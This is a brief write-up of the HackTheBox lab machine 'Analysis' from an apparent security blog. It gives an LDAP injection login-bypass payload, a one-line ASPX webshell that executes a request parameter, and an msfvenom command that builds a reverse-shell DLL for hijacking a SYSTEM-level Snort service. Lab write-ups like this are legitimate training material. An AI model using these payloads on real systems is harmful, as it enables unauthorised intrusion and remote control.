---
TitleSEO:    "HackTheBox Analysis Writeup | ZureFX"
TitlePost:   "HTB Analysis — Hard Windows"
Author:      "ZureFX"
Description: "HackTheBox Analysis writeup. LDAP injection, ASP webshell, DLL hijacking and Snort dynamic preprocessor abuse for root."
Keywords:    "hackthebox, analysis, writeup, ldap injection, dll hijacking, windows, hard"
URL:         "https://zurefx.github.io/writeups/htb-analysis.html"
URL_IMAGES:  "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-analysis/"
Date:        "2026-03-19"
Tags:        "HackTheBox, Hard, Windows, LDAPInjection, DLLHijacking"
Section:     "writeups"
Lang:        "en"
main_img:    "htb-analysis"
Permalink:   "/writeups/htb-analysis.html"
BtnLabel:    "Read Writeup"
---

## Enumeration

Web app with login. Username field vulnerable to LDAP injection.

## LDAP Injection

```
user=*)(&
pass=anything
```

Bypasses auth, leaks all user attributes including cleartext passwords in description fields.

## Foothold

Credentials → upload ASP webshell to a writable directory found via gobuster.

```aspx
<%@ Page Language="C#" %>
<% Response.Write(System.Diagnostics.Process.Start(Request["cmd"])); %>
```

## Privilege Escalation

Snort running as SYSTEM, loads DLLs from a user-writable path.

```bash
# Drop malicious DLL → wait for Snort to reload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=9001 -f dll -o sf_engine.dll
```
